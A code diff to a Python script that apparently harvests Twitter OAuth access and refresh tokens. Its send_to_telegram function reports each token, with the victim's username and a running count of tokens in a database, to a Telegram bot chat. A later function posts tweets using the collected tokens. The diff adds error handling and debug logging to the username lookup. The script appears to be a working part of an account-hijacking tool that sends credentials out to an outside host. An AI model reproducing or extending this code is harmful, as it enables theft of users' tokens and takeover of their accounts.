@@ -149,30 +149,42 @@ def send_to_telegram(access_token, refresh_token=None):
     message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
     message += f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"
     message += f"🔢 *Total Tokens in Database:* {total_tokens}"
+    
+    # Send the message to Telegram ensuring UTF-8 encoding
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
         "parse_mode": "Markdown"
     }
+    
+    # Ensure proper encoding in the request
     response = requests.post(url, json=data)
+    
     if response.status_code != 200:
         print(f"Failed to send message via Telegram: {response.text}")
 
-
-# Get Twitter username
 def get_twitter_username(access_token):
     url = "https://api.twitter.com/2/users/me"
     headers = {
         "Authorization": f"Bearer {access_token}"
     }
-    response = requests.get(url, headers=headers)
-    if response.status_code == 200:
+    
+    try:
+        response = requests.get(url, headers=headers)
+        response.raise_for_status()  # Raise an error if the status code is not 200
+        
         data = response.json()
-        username = data.get("data", {}).get("username")
-        return username
-    else:
-        print(f"Failed to fetch username. Status code: {response.status_code}")
+        print(f"Twitter API response: {data}")  # Log the full response for debugging
+        
+        username = data.get("data", {}).get("username")  # Extract username
+        if username:
+            return username
+        else:
+            print("No username found in the response.")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to fetch username: {str(e)}")
         return None
 
 # Function to post a tweet using a single token
